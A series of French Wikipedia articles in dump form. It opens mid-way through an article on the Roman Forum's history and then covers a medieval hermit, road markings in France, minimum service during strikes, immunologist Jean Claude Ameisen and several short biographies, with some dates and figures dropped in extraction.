Selon la tradition, Camille, qui a défait les Gaulois (mais ce fait est très controversé : voir le lien Brennus), élève un temple dédié à la Concorde sur le forum, sur les pentes du Capitole, en -367, pour célébrer la promulgation des lois licinio-sextiennes. Le "Comitium" est réaménagé à partir de 338 av. J.-C., date à laquelle on fixe des éperons de navires à la tribune des orateurs qui est baptisée "Rostra". En 304 av. J.-C., l'édile Cnaeus Flavius, protégé du censeur Appius Claudius, élève un autel également dédié à la Concorde sur le "Comitium", à proximité du Volcanal, ancien sanctuaire dédié à Vulcain. Une nouvelle restauration est menée en -264 à l'instigation du consul Manius Valerius Messalla, au début de la première guerre punique.
Le forum est de nouveau dallé après l'invasion gauloise, puis une troisième fois en -338. À chaque fois, le nouveau dallage prend appui sur l'ancien, entraînant une élévation du sol.
Certains des sanctuaires les plus anciens, comme le "Lapis niger" ou le "Lacus Curtius", se retrouvent en sous-sol avant d'être recouverts à cause de la différence de niveau trop importante.
De chaque côté du forum, les premières boutiques qui existent depuis la Monarchie sont groupées en deux rangées qui se font face et introduisent dans le plan général de la place un semblant de symétrie. Sur le côté sud, les boutiques s'étendent du temple de Saturne au temple des Dioscures et au nord, elles bordent la "Via Sacra". En 210 av. J.-C., cette dernière rangée est détruite dans un incendie et est reconstruite sous le nom de Boutiques neuves ("Tabernae Novae") par opposition aux Boutiques anciennes ("Tabernae Veterae") qui ont disparu. La présence de nombreuses boutiques qui drainent un flux considérable de marchands et de passants, renforce la fonction commerciale du Forum.
Les grands travaux d'envergure qui transforment définitivement le forum n'interviennent pas avant la fin des guerres puniques en Occident et la mainmise sur les États grecs en Orient.
Rome devient alors la capitale d'un empire qui domine le bassin méditerranéen. En conséquence, la ville se doit de se doter de structures adaptées à son nouveau rôle. Durant le , en quelques décennies seulement, la topographie du forum est radicalement transformée. Pour ne citer que les réalisations les plus importantes, ce n'est pas moins de quatre basiliques (Porcia, Aemilia, Sempronia et Opimia) qui sont construites et deux grands temples (dédiés à la Concorde et aux Dioscures) qui sont entièrement reconstruits.
Fin de la République.
Au début du , Sylla ferme la perspective vers l'ouest en construisant sur les pentes du Capitole la grande façade du "Tabularium". Avec les basiliques Sempronia et Aemilia sur les côtés, le forum devient une place fermée. Cette tendance à rendre la place monumentale se renforce encore avec les projets d'urbanisme de César et d'Auguste à la fin du et au début du . Le "Comitium" perd peu à peu son rôle politique et l'activité commerciale diminue, déjà délocalisée en partie dans le grand "Macellum" construit par les censeurs de 179 av. J.-C.
À la fin de la République, le vaste Empire romain s'étend de la Gaule à la Syrie et le vieux forum républicain ne peut plus jouer le rôle d'unique centre politique et économique de Rome. En réponse à ce besoin d'espace, Jules César, qui présente son projet comme un agrandissement du vieux forum, entreprend en fait la construction d'un nouveau forum. César tente d'organiser le forum en introduisant un ordre perceptible dans l'agencement des différents édifices. Il fait reconstruire la Curie qui comble la lacune que représente le "Comitium" dans le prolongement de la basilique Æmilia qu'il fait restaurer. En face, la basilique Sempronia est reconstruite et devient la basilique Julia. Son assassinat en 44 av. J.-C. met un terme à ces bouleversements topographiques.
Le forum sous l'Empire.
Plus prudent que son père adoptif, Auguste se lance également dans un grand programme d'urbanisme et fait construire le temple de César précédé d'une tribune à l'extrémité sud du forum, achevant de fermer la place. De part et d'autre du temple sont élevés des arcs de triomphe qui servent d'entrées monumentales pour qui accède au forum depuis la "Via Sacra" ou le "Vicus Vestae". Le forum adopte alors sa forme définitive, celle d'un quadrilatère fermé sur ses quatre côtés, entouré sur deux côtés par des portiques (ceux des basiliques Julia et Aemilia) et fermé sur les deux autres par un temple.
Après l'avènement de l'Empire, le forum perd sa fonction politique, les pouvoirs du Sénat devenant de plus en plus faibles. Le centre politique de Rome se déplace alors du forum vers le Palatin où les empereurs font aménager un vaste complexe palatial. Le forum n'est pas délaissé pour autant et s'encombre avec le temps de monuments honorifiques. L'arc de Septime Sévère achève la monumentalisation du côté ouest du forum. La colonne de Phocas est traditionnellement considérée comme le dernier monument érigé sur le forum.
Moyen Âge.
Durant le Haut Moyen Âge, le forum est progressivement laissé à l'abandon à partir du . La plupart des monuments ne sont plus identifiables dès le . Ils sont progressivement ensevelis et laissent la place à des pâturages pour les vaches. Les édifices qui ont été préservés jusqu'à aujourd'hui doivent leur bon état de conservation à leurs transformations en églises qui commencent dès le . Après le , les monuments du forum sont démantelés et réaménagés en structures défensives. Après le , ces structures sont elles-mêmes détruites et les débris contribuent à élever le niveau du sol. Le retour du pape Urbain V à Rome depuis Avignon en 1367 entraîne un regain d'intérêt pour les ruines du forum : elles illustrent le destin des cultes païens et servent de carrière pour les nouvelles réalisations architecturales. Le forum est alors lentement dépouillé de ses dernières colonnes et statues qui sont détruites dans des fours à chaux afin d'en récupérer le marbre. Le Forum romain qui est depuis longtemps envahi par l'herbe et où on laisse paître des troupeaux de vaches est connu dorénavant sous le nom de "Campo Vaccino", jusqu'aux fouilles menées sous Napoléon III.
Fouilles archéologiques.
Des artistes ont déjà réalisé quelques dessins des ruines du forum et des antiquaires ont relevé les fragments des inscriptions au cours du . Une première tentative de dégagement des ruines est tentée au début du . Mais ce sont les fouilles menées par Carlo Fea et le déblaiement de l'arc de Septime Sévère qui marquent le début de véritables fouilles archéologiques. Le reste du forum est en partie dégagé durant celles ordonnées par Napoléon III.
Description.
Contrairement aux forums impériaux qui ont été réalisés chacun par un seul architecte et ordonnés par un seul commanditaire, le Forum romain s'est développé graduellement tout au long de près d'un millénaire. Jusqu'à ce que Sylla, César ou Auguste tentent d'y trouver une cohérence architecturale, la localisation des monuments du forum a donné l'impression d'avoir été choisie au hasard, sans volonté d'obtenir une place structurée. Après l'action organisatrice des hommes forts de la fin de la République, le Forum romain adopte la forme d'un quadrilatère régulier, presque rectangulaire, de 130 à de long sur 50 à de large.
La longueur de la place est orientée selon un axe menant du nord-ouest vers le sud-est. Elle fait communiquer les pentes du Capitole avec la colline de la Velia. Les longs côtés de l'esplanade sont délimités en partie par la basilique Julia au sud et par la basilique Æmilia au nord. Certains adjoignent au forum la zone qui s'étend de la "Regia" à l'arc de Titus et qui est baptisée "Forum Adiectum".
Depuis le forum, on accède au Capitole en suivant le "Clivus Capitolinus" qui longe le temple de Saturne. Au nord, le forum communique avec le Champ de Mars par un passage étroit, le "Clivus Argentarius" qui sera élargi par les travaux d'excavation menés au cours du et au début du . De l'autre côté, les deux grandes rues "Via Sacra" et "Via Nova" relient le forum à la partie orientale de la ville. Depuis le forum démarre l’"Argiletum" qui dessert le quartier populaire de Subure. En face, de part et d'autre de la basilique Julia, débouchent le "Vicus Iugarius" et le "Vicus Tuscus".
Monuments remarquables.
À la fin de l'Empire, en arrivant depuis la "Via Sacra", on longe d'abord la grande basilique de Maxence et Constantin puis le temple de Romulus et le temple d'Antonin et Faustine qui fait face à la "Regia". On passe ensuite sous un des deux arcs d'Auguste qui couvre l'étroit passage entre le temple de César à gauche et la basilique Æmilia à droite. S'ouvre alors l'esplanade du forum, surchargée de monuments honorifiques (statues équestres, bases et colonnes honorifiques, etc.).
À l'extrémité du portique de la basilique Æmilia démarre vers la droite l’"Argiletum" qui traverse d'abord le "Forum Transitorium" avant de s'enfoncer dans Subure. La voie est délimitée de l'autre côté de la basilique par la Curie Julia, dont l'orientation est légèrement différente. Plus loin, la prison Mamertine est construite sur les pentes de la colline de l'Arx au sommet de laquelle on accède par un long escalier qui démarre entre la prison et le temple de la Concorde. En avant, s'élève l'arc à trois baies de Septime Sévère. En tournant à gauche derrière l'arc, on emprunte le "Clivus Capitolinus" qui permet d'accéder à la terrasse du Capitole. Sur la droite, la pente de la colline est occupée par le temple de la Concorde et le temple de Vespasien qui dissimule le soubassement de la grande façade du "Tabularium". Le "Clivus Capitolinus" se rétrécit pour passer entre le temple de Vespasien puis le portique des Dieux Conseillers et le temple de Saturne.
En arrivant à hauteur du haut podium du temple de Saturne, on tourne à gauche pour passer entre les Rostres et la basilique Julia. La voie est délimitée d'un côté par le portique de la basilique et de l'autre par la succession de sept grandes colonnes honorifiques. Arrivé au bout du portique, une rue, le "Vicus Tuscus" s'ouvre à droite et descend vers le Tibre en passant par le Vélabre. En face, un deuxième arc d'Auguste marque une deuxième entrée sur le forum, entre la tribune qui précède le temple des Dioscures et le temple de César. Après avoir franchi cet arc, on se trouve tout près du sanctuaire de Vesta, au pied du Palatin.

</doc>
<doc id="1873875" url="https://fr.wikipedia.org/wiki?curid=1873875" title="Giovanni Bono">
Giovanni Bono

Giovanni Bono (Mantoue, 1168 – Mantoue, ) est ermite italien qui a passé d'une vie d'acteur itinérant à celle d'un religieux dévoué à la prière et à la charité.
Vie.
Les premières années.
À l'âge de 16 ans, il perdit son père, et quitta le domicile familial pour courir le monde. Il fut acteur comique, dans une troupe qui allait de ville en ville donner des représentations sur les places et dans les palais des nobles. On les accusait d'en profiter pour commettre quelques plaisanteries de mauvais goût et aussi quelques larcins. Ils étaient considérés comme des citoyens de seconde zone, non respectueux des lois.
La vie religieuse.
En 1206, il tomba gravement malade, et fit vœu de changer complètement de vie s'il recouvrait la santé. Guéri, il tint sa promesse, et se fit ermite à Bertinoro puis à Césène, où il vécut dans la prière et la pénitence. 
Petit à petit, il eut des disciples, de nombreux jeunes hommes qui souhaitaient faire de lui leur guide spirituel. Ce sont eux qui construiront la première maison de leur future congrégation tandis que Giovanni continuait de vivre en ermite, ne possédant que deux manteaux, un peu de paille, une table sur laquelle il dormait tout habillé, un crucifix et une image de la Vierge, et un flacon d'eau bénite.
À côté de son ermitage fut édifiée l'église de Sainte Marie de Butriolo, où il allait tous les jours écouter la Messe. Il se confessait très fréquemment, il était humble, bon et charitable.
Il recevait la visite de personnes attirées par la profondeur de son discours spirituel, alors qu'il était quasiment analphabète, ne connaissait que quelques prières par cœur et n'avait eu comme éducation religieuse que celle que lui avait prodiguée ses parents dans son enfance.
Avec les autres hommes dont il était le modèle spirituel il fonda un ordre religieux et plusieurs monastères obéissant à une règle inspirée de saint Augustin. 
Quand il eut une soixantaine d'années, il souhaita remettre entre des mains plus fortes sa communauté, lui permettant ainsi de consacrer la fin de sa vie à la prière et à la contemplation.
Au début d'octobre 1249 il partit avec quelques disciples vers Mantoue, et se retira dans l'ermitage Sainte Agnese in Porto, où il mourut le 16 du même mois.
Le peuple le considérait comme un saint. En son honneur, la ville de Mantoue fit exécuter son portrait sur le mur d'un palais.
Béatification.
Il fut béatifié en 1483 par le Pape Sixte IV. Sa fête est le (mais elle a été aussi célébrée le ).

</doc>
<doc id="1873877" url="https://fr.wikipedia.org/wiki?curid=1873877" title="Smaïl Chaoui">
Smaïl Chaoui

Smaïl Chaoui est un footballeur algérien né le à Chlef. Il évolue au poste de défenseur au MCB Oued Sly.

</doc>
<doc id="1873878" url="https://fr.wikipedia.org/wiki?curid=1873878" title="Cove">
Cove

Toponymie.
Cove est un nom de lieu, signifiant littéralement "crique" en anglais, notamment porté par :

</doc>
<doc id="1873882" url="https://fr.wikipedia.org/wiki?curid=1873882" title="Jauge de contrainte">
Jauge de contrainte



</doc>
<doc id="1873884" url="https://fr.wikipedia.org/wiki?curid=1873884" title="Baruc">
Baruc



</doc>
<doc id="1873885" url="https://fr.wikipedia.org/wiki?curid=1873885" title="Signalisation routière horizontale en France">
Signalisation routière horizontale en France

La signalisation routière horizontale regroupe, dans le cadre de la signalisation routière, l'ensemble des marques sur chaussées utilisées pour matérialiser les règles d'utilisation des voies ouvertes à la circulation publique. Elle constitue une aide importante à la conduite, en canalisant les flux de circulation, en précisant des règles de prescription, en matérialisant le stationnement et en guidant visuellement l'usager, en particulier la nuit en rase campagne.
Contexte réglementaire.
En France, la signalisation routière horizontale est régie par l'arrêté du 10 mai 2000 (conformité des produits), par l'arrêté de 1967 (convention internationale de Vienne sur la signalisation routière) et par l'Instruction interministérielle sur la signalisation routière, en particulier la du livre I de la Signalisation Routière. L'arrêté interministériel s'applique à toutes les voies ouvertes à la circulation publique (art. 44), tant en milieu urbain qu'en rase campagne. Les voies ouvertes à la circulation publique comprennent les routes interurbaines et urbaines (autoroutes, voies rapides, voies rapides urbaines, routes nationales, routes départementales, routes communales), mais également l'ensemble des espaces publics ou privés correspondants (parkings publics ou commerciaux, zones d'activités industrielles ou commerciales). Ces règles traduisent certaines dispositions du Code de la Route. 
Le marquage n'est pas obligatoire, sauf sur les routes à chaussées séparées, les routes express à quatre voies en rase-campagne, ou bien en tant que marque associée aux signaux « Stop » ou « Cédez le passage » ou en tant que ligne d'effet de feux tricolores. Le marquage des voies de circulation incombe au maître d'ouvrage (État, collectivité, concessionnaire, propriétaire privé) qui en a la compétence. 
Dès qu'une voie ouverte à la circulation publique est marquée, la signalisation horizontale doit respecter les règles définies dans la réglementation.
Couleurs des marques.
Le blanc est la couleur utilisée pour les marquages sur chaussée.
Pour certains marquages spéciaux, on utilise d'autres couleurs dans les conditions suivantes :
L'emploi de la couleur sur la chaussée est de plus en plus fréquent. La disparité des traitements actuels entraîne des confusions et incompréhensions pour l'usager. La circulaire du 15 mai 1996 donnait des directives et des recommandations visant à ne pas abuser de l'utilisation de la couleur sur la chaussée.
Largeur des lignes.
La largeur des lignes est définie par rapport à une largeur unité "u" différente selon le type de route.
On adopte les valeurs suivantes pour l'unité "u" : 
La valeur de "u" doit être homogène sur tout un itinéraire. En particulier, elle ne doit pas varier au passage d'un département à l'autre.
Marques longitudinales.
Ligne continue.
Il est interdit aux conducteurs de franchir ou chevaucher une ligne longitudinale continue axiale ou séparative de voies de circulation. Les différents types de lignes continues sont les suivants.
Cependant, depuis le , il est autorisé le chevauchement pour dépasser un cycliste qu'il soit hors agglomération ou en agglomération, sous réserve de respecter les prescriptions concernant le dépassement. 
Lignes discontinues.
Caractéristiques des lignes discontinues.
Pour la bonne compréhension des marquages, quatre types de modulations de lignes longitudinales ont été retenus, se différenciant par le rapport des pleins aux vides.
Ces modulations (tirets plus intervalles) sont des multiples de .
Pour les lignes transversales, la modulation T'2 comporte alternativement de trait et de vide.
Le tableau ci-après donne les caractéristiques de tous les types de lignes discontinues :
Typologie des lignes discontinues.
Lignes longitudinales axiales :
Lignes longitudinales de rives ou de délimitation de certaines voies
Quatre types de modulations peuvent être employées en rive de chaussée ou pour délimiter certaines voies : 
Les domaines d'usages sont décrits dans le tableau ci-après :
Marques transversales.
On distingue trois types de marques transversales :
Marquage d'une route en rase campagne.
Le marquage d'une route de rase campagne en section courante, c’est-à-dire hors points singuliers et hors intersections, est le suivant :
Marquage d'une route en milieu urbain.
Le marquage des routes en milieu urbain permet de délimiter les voies de circulation afin de mieux utiliser l'espace roulable en canalisant le trafic. Il est notablement différent de celui en rase campagne.
Marquage de voies particulières.
Voies de stockage.
Ce sont des voies permettant d'effectuer un changement de direction. Les voies de stockage sont signalées par des flèches de sélection, et sont délimitées par une ligne discontinue de type T2 5u.
Voies d'accélération et de décélération.
Ces voies permettent d'accéder ou de quitter les routes à chaussées séparées et les autoroutes. Comme pour les voies de stockage, une voie d'accélération ou de décélération se prend dès le début. Elles sont aussi délimitées par des traits plus larges de type T2 5u.
Les voies d'accélération permettent aux véhicules entrants d'atteindre progressivement la vitesse de ceux roulant sur la route rejointe afin de pouvoir s'insérer dans la circulation par une manœuvre de rabattement effectuée au moment opportun. Elles se terminent par un panneau « cédez-le-passage » qui rappelle que les véhicules empruntant cette voie n'ont pas la priorité : en cas de trafic intense sur la voie principale, les conducteurs doivent, au besoin, ralentir voire stopper, afin d'attendre de pouvoir s'insérer dans la circulation.
Les voies de décélération se terminent souvent par un virage serré. La vitesse de la voie sur laquelle le conducteur circule ( ou ) étant nettement supérieure à celle nécessaire pour prendre le virage ( voire moins), il est nécessaire de ralentir considérablement : c'est la fonction de la voie de décélération. Des panneaux de limitation de vitesse le long de la voie indiquent de combien ralentir.
Voies d'entrecroisement seule.
Ce sont des voies qui permettent à la fois d'entrer et de sortir d'une route. Le marquage de séparation d'avec la section courante est constitué par une ligne discontinue T2 de largeur 5u.
Voies pour véhicules lents.
On les rencontre généralement dans les côtes. Elles sont réservées et obligatoires pour tous les véhicules roulant à ou moins, afin qu'ils ne gênent pas la circulation normale ; toutefois, un véhicule lent peut sortir de cette voie pour effectuer le dépassement d'un autre véhicule lent. 
Le marquage de ce type de voie est le suivant :
Au début de la voie, on trouve un panneau d'obligation où est écrit "véhicules lents" complété par un panonceau où est dessinée une flèche pointant en bas à droite.
Voies réservées à certains usagers.
Article détaillé : Aménagement cyclable
Il est interdit de stationner ou s'arrêter sur une piste ou une bande cyclable. Parfois, les cyclomoteurs sont autorisés à y rouler : un panonceau le précise alors (décision prise par arrêté municipal).
Marquages relatifs aux priorités.
Une signalisation horizontale complète, aux intersections, les panneaux de priorité :
Le marquage doit accompagner le panneau pas l'un sans l'autre.

</doc>
<doc id="1873887" url="https://fr.wikipedia.org/wiki?curid=1873887" title="Les Sabots en or">
Les Sabots en or

Les Sabots en or ( soit "Safa'ih min dhahab") est un film tunisien réalisé en 1988 par Nouri Bouzid.
Synopsis.
Youssef Soltane, un intellectuel de 45 ans, est le pur produit d'une génération qui a connu les périodes euphoriques des grandes idéologies des années 1960 et aussi leur faillite collective. Youssef fut emprisonné longtemps et torturé pour ses activités d'opposant politique. Sa liaison tumultueuse avec Zineb, la jeune et belle bourgeoise, qui lui a fait découvrir l'amour et l'avait hébergé et caché à l'époque de ses activités clandestines, ne lui vaut plus que des déboires. Quelques mois après sa sortie de prison, son épouse répudiée, Fatma, est morte, laissant les trois enfants à la garde de leur grand-mère. Au cours de cette longue nuit d'hiver, celle de la fête de l'Achoura, Youssef va errer à la recherche d'un refuge affectif, d'une tendresse, en proie à toutes les interrogations qui secouent sa mémoire.

</doc>
<doc id="1873891" url="https://fr.wikipedia.org/wiki?curid=1873891" title="Service minimum">
Service minimum

Le service minimum désigne l'obligation faite aux salariés et entreprises, en particulier de services publics et notamment de transports en commun, d'assurer un service minimum, en toute circonstance et en particulier en temps de grève, pendant les périodes de pointe.
Cette disposition limite le droit de grève. Son but est d’assurer une continuité du service public de transport. Elle est critiquée par les syndicats de salariés comme restriction du droit de grève.
En Europe.
Selon un rapport d'information de l'Assemblée nationale, la moitié des pays européens a mis en place une législation instaurant une obligation de service minimum et tous reconnaissent le droit de grève. Ceux qui ne disposent pas d'une législation spécifique ne sont pas confrontés au besoin car la culture du dialogue social prévient les conflits. Toujours selon ce rapport de l'Assemblée nationale, la France constitue « un cas particulier, qui explique le caractère conflictuel du sujet et pourrait justifier une réforme prochaine. »
En Allemagne et en Autriche, les fonctionnaires statutaires () ne disposent pas du droit de grève, sans que cela « ne choque personne ».
En Espagne et en Italie, il existe un service minimum pour les périodes de pointe.
En France.
Historique français.
Historiquement en France la notion de service minimum couvre différents concepts comme le service assuré en heure creuse qui au moment de l'heure creuse est au niveau minimal. Ce concept est subventionné et négocié par une clause contractuelle qui répond à un cahier des charges.
En 1980, une clause de service minimum est suggérée pour assurer la sécurité des enfants dont des moniteurs privés s'occupent.
En 1986, 31% des entreprises souhaitent que la poste organise un service minimum en cas de grève.
En 1990 le service minimum de proximité est perçu comme un moyen d'éviter des déplacements en centre-bourg.
En 1992, Air France cherche à mettre en place un service minimum garanti pour homogénéiser la qualité de service .
En 1993, un sondage montre que 83% des cadres souhaitent qu'en cas de grèves des salariés d'Air Inter, la compagnie assure un service continu.
En 1997, un article de "La Pensée : revue du rationalisme moderne" considère que la notion de service minimum est copiée du système américain pour s'inscrire dans une logique libérale et mondiale, et qu'à ce titre elle succède au principe de continuité du service rendu.
En 1997, l'UFC-Que-Choisir considère que le service minimum est un élément du second principe auquel l'organisation est attaché : la continuité de service.
En 1997, l'association française des trésoriers d'entreprises propose un service minimum bancaire qui consisterait en la gratuité des services minimum de base pour un particulier.
En 1999, les personnel d'Air France a défini 115 règles à observer pour fournir une qualité de service minimum.
En 2000, un magazine du "Secours populaire français" fait écho à un débat sur le service minimum bancaire concernant notamment la gratuité des chèques.
En 2000, l'Union nationale des caisses d'allocations familiales considère que le service minimum est introduit par l'Union européenne, avec la notion de service universel.
En 2001, le service minimum est perçu comme un outil destiné à lutter contre les corporatismes et à donner davantage de pouvoir au gouvernement.
En 2004, de concert, le MEDEF et le gouvernement veulent .
Revendications et idéologie.
Le service minimum est une ancienne idée médiatisée depuis le début du siècle par des partis politiques de droite ou de centre droite, des sociétés et certaines « organisations de défense des usagers » de droite. 
Les « usagers » payeraient l'utilisation des transports en commun et sont donc, selon , en droit d'attendre un service en retour. Parmi les partisans du service minimum, on retrouve plusieurs mouvements :
La proposition d'instaurer un service minimum resurgit à chaque mouvement de grève concernant les transports en commun. Selon la Fédération des usagers des transports et des services publics (FUT-SP), le service minimum est inutile pour les usagers : « la dégradation de la qualité des transports constitue désormais le sujet de préoccupation n°1 des usagers. Si les usagers n'accueillent pas avec plaisir les mouvements de grève, les problèmes des usagers ne cessent pas lorsque la grève s’arrête. Bien au contraire, c'est tous les jours de l'année que les usagers sont victimes de retards, de pannes, d’annulations de trains, d’incidents techniques dus au manque de matériel moderne, à l'entretien déficient des rames et des installations
fixes, et aux effectifs insuffisants ».
Selon la CGT cheminots, sur incidents relevés par la SNCF ayant occasionné des retards ou des annulations de trains, seuls 2 % sont imputables aux mouvements sociaux. Les autres retards et annulations sont dus à des problèmes matériels qui sont en grande partie liés au manque d'investissement et de personnel.
Pour l'UMP, les grèves dans les transports sont injustes, étant donné les avantages de ceux qui y travaillent. En Île-de-France, elles gêneraient surtout les habitants les moins favorisés, non motorisés, habitant en banlieue.
Nicolas Sarkozy s'est engagé sur la mise en place du service minimum lors de la campagne présidentielle de 2007 ; il a déclaré, le , s'engager à « garantir trois heures de transport en continu pour se rendre à son travail en cas de grève et trois heures pour en revenir ».
Fondement juridique.
Le service minimum doit être accordé à la fois au droit de grève à la valeur constitutionnelle, et à la disposition constitutionnelle du Préambule de 1946 : "7. Le droit de grève s'exerce dans le cadre des lois qui le réglementent." . Les principes invoqués pour le justifier sont la continuité du service public, le devoir de travailler, la liberté d'aller et venir, le respect des contrats de travail, la responsabilité civile qui oblige tout auteur d'un dommage à autrui de réparer ce dommage. L'intérêt des usagers, tiers aux conflits sociaux, les dommages qui leur sont causés, sont également invoqués.
Critique du service minimum.
La critique du service minimum est faite, essentiellement, par les syndicats de salariés et les partis de gauche. Selon eux, le service minimum remet en cause le droit de grève, qui a valeur constitutionnelle. Ils craignent que la grève soit vidée de sa substance. Le but d'une grève est de satisfaire des revendications professionnelles, or la grève avec service minimum aurait bien moins d'impact. Le service minimum permettrait à l'entreprise, par exemple dans les transports, d'engranger un chiffre d'affaires quasi équivalent à une période normale : le service minimum s'établit aux heures de pointe, donc aux heures où le plus d'utilisateurs paient leurs tickets.
État du droit français.
Le service minimum existe depuis longtemps dans quelques domaines particuliers tels que le nucléaire, l'audiovisuel, la santé et le contrôle aérien.
La loi n°2007-1224 du « sur le dialogue social et la continuité du service public dans les transports terrestres réguliers de voyageurs » (JO, , ) votée le sous le gouvernement Fillon II institue des règles pour favoriser le dialogue social et permettre une meilleure organisation des services de transports publics terrestres en cas de grève sans mettre en place une véritable obligation de service minimum. La loi instaure l'obligation pour les salariés d'indiquer quarante-huit heures à l'avance qu'ils ont l'intention de faire grève pour permettre aux collectivités locales de réorganiser le service sur les dessertes les plus importantes, en substituant des non-grévistes aux grévistes. La mise en œuvre de l'obligation de service minimum aux heures de pointe est laissée aux accords entre syndicats et autorités organisatrices des transports. Le fret, la poste et les transports publics non terrestres ne sont pas concernés. Cette loi du a été abrogée par l'ordonnance n° 2010-1307 du et introduit aux articles L. 1222-1 et suivants du code des transports. 
Le service minimum d'accueil à l'école a été mis en place par Xavier Darcos durant le second semestre 2007. Il s'applique si plus de 25 % des enseignants d'une école maternelle ou élémentaire ont annoncé faire grève. Les communes doivent alors assurer un service minimum d'accueil et bénéficient en contrepartie d'une compensation financière de l'Etat.
Au Québec.
Instauré en 1982, le chapitre V.1 du Code du travail (Dispositions applicables aux services publics et aux secteurs public et parapublic) encadre le maintien d'un service minimum en cas de grève. Pour les services publics visés par la section II de ce chapitre, le gouvernement peut ordonner à un employeur et à une association accréditée de maintenir des services essentiels en cas de grève si une interruption de service pourrait menacer la santé ou la sécurité publique. Les parties doivent alors négocier ces services avant qu'une grève puisse être déclenchée. Le "lock-out" est interdit pour les employeurs assujettis au régime en vertu de l'article 111.0.26.
Pour les établissements de santé non visés par les dispositions relatives aux services publics, l'article 111.10 de la section III du chapitre V.1 impose un niveau de service minimum en fonction des activités de l'établissement. Pour les secteurs public et parapublic, les services à maintenir sont négociés entre les parties et, à défaut, déterminés par le Tribunal administratif du travail.

</doc>
<doc id="1873893" url="https://fr.wikipedia.org/wiki?curid=1873893" title="Jean Claude Ameisen">
Jean Claude Ameisen

Jean Claude Ameisen, né le à New York aux États-Unis, est un médecin, immunologiste et chercheur français en biologie. Il est directeur du Centre d'études du vivant de l'Institut des humanités de Paris de l'université Paris-Diderot et a été président du Comité consultatif national d'éthique (2012-2016).
Il publie plusieurs ouvrages de vulgarisation et anime l'émission de radio de France Inter intitulée "Sur les épaules de Darwin".
Biographie.
Famille.
Le père de Jean Claude Ameisen, Emanuel Ameisen, est d'origine polonaise et juive. Il émigre à Paris dans les années 1930, où il devient ingénieur après avoir réalisé des études à Grenoble. Sa mère, Janine Ameisen, est artiste-peintre et rescapée d'Auschwitz. Après la guerre, elle émigrera aux États-Unis où naît Jean Claude Ameisen.
Il est le frère aîné d'Olivier Ameisen, médecin connu pour avoir expérimenté sur lui-même avec succès le baclofène contre son alcoolodépendance et d'Éva Ameisen, stomatologue et autrice-compositrice.
Formation et carrière scientifique.
Jean Claude Ameisen fait ses études secondaires au lycée Louis-le-Grand et à l'École alsacienne, puis étudie la médecine à la faculté de médecine de l'hôpital Cochin puis au CHU de Lille où il fait son internat. Il se spécialise en pneumologie et s'oriente vers la recherche en immunologie au sein de l'INSERM. Il est post-doctorant puis chercheur associé en immunologie à la faculté de médecine de l'université Yale (1986-1987). Il devient maître de conférences et praticien hospitalier (MCU-PH) en immunologie au CHU de Lille (1989-1996). En 1994, il est nommé directeur de l'unité Inserm U415 à l'Institut Pasteur de Lille. Il est nommé en 1996 professeur associé invité à l' (LIAI) en Californie et, en 1998, professeur d'immunologie à l'hôpital Bichat (université Paris-Diderot). En , il est nommé directeur du Centre d'études du vivant de l'Institut des humanités de Paris.
Fonctions au sein des comités d'éthique.
Jean Claude Ameisen a été président du comité d'éthique de l'INSERM de 2003 à 2012, et devient en 2005 membre du Comité consultatif national d'éthique (CCNE). Le , sur proposition du président de la République François Hollande, la Commission des affaires sociales de l'Assemblée nationale et celle du Sénat approuvent sa nomination à la présidence du CCNE en remplacement d'Alain Grimfeld ayant achevé son mandat. Il prend ses fonctions le , il devient président d'honneur lors de la nomination de Jean-François Delfraissy le .
Il a été président du Comité éthique et scientifique de la Fondation internationale de la recherche appliquée sur le handicap (FIRAH) de 2009 à 2013.
Autres engagements dans la société civile.
Auteur de nombreux essais sur la science, il est, depuis , le concepteur et l'animateur de l'émission "Sur les épaules de Darwin" de France Inter. Pour cela notamment, il reçoit en 2022 la médaille de la médiation scientifique du CNRS. 
Il a été le président de la Conférence française pour la biodiversité tenue à Chamonix-Mont-Blanc en , l'année internationale de la biodiversité, puis du Comité de révision de la stratégie nationale pour la biodiversité en 2011.
Il a rejoint en l'équipe de campagne de Martine Aubry pour l'élection présidentielle de 2012, chargé, avec Charlotte Brun, du sujet « Personnes âgées, Dépendance, et Handicap ».
En 2016, il est devenu parrain de la promotion ECN 2020 de la faculté de médecine de Nancy.
Apports scientifiques.
Jean Claude Ameisen est connu principalement pour ses travaux sur les processus de mort cellulaire programmée ou apoptose en physiopathologie et au cours de l'évolution.

</doc>
<doc id="1873896" url="https://fr.wikipedia.org/wiki?curid=1873896" title="Sous-soleuse">
Sous-soleuse



</doc>
<doc id="1873897" url="https://fr.wikipedia.org/wiki?curid=1873897" title="Rob Millar">
Rob Millar

Rob Millar (né le à Smithers, province de la Colombie-Britannique au Canada) est un joueur de hockey sur glace professionnel.
Carrière de joueur.
Il commence sa carrière en 1995 aux Harvard Crimson en NCAA où il va évoluer pendant 4 saisons. Il passe ensuite deux saisons en ECHL puis UHL. En 2002, Dennis Murphy le fait venir aux Ours de Villard-de-Lans en Ligue Magnus. En 2004, il termine meilleur pointeur des playoffs avec l'ASG Tours avec qui il échoue en finale. La saison suivante, il signe chez les Diables Rouges de Briançon qui perdent en finale de Coupe de France au cours de laquelle il égalise dans la dernière minute de jeu du temps réglementaire après avoir raté un lancer de pénalité en début de rencontre. En 2006, il porte les couleurs de Amiens avec qui il réalise une saison très difficile avec seulement huit points en 25 matchs de saison régulière.

</doc>
<doc id="1873903" url="https://fr.wikipedia.org/wiki?curid=1873903" title="Sabre en bois">
Sabre en bois



</doc>
<doc id="1873908" url="https://fr.wikipedia.org/wiki?curid=1873908" title="Jimmy Michael">
Jimmy Michael

Jimmy (James) Michael, né le à Aberaman au Pays de Galles et mort le , est un cycliste sur piste britannique des années 1890-1900. Il est professionnel de 1895 à 1904. Durant sa carrière, il a pour entraîneur Choppy Warburton et s'entraine avec l'assistance d'Arthur Linton. Il devient professionnel en 1895, et remporte la même année le championnat du monde de demi-fond à Cologne. Après la mort de Lipton, il émigre aux États-Unis, pour y battre des records et gagner une fortune. Il cesse le cyclisme, devient jockey et propriétaire d'un écurie de chevaux de courses. L'entreprise fait faillite et il décide de retourner à New York. Il meurt le d'un "delirium tremens" dans le transatlantique "La Savoie" lors d'une traversée le ramenant à New York.
Origines.
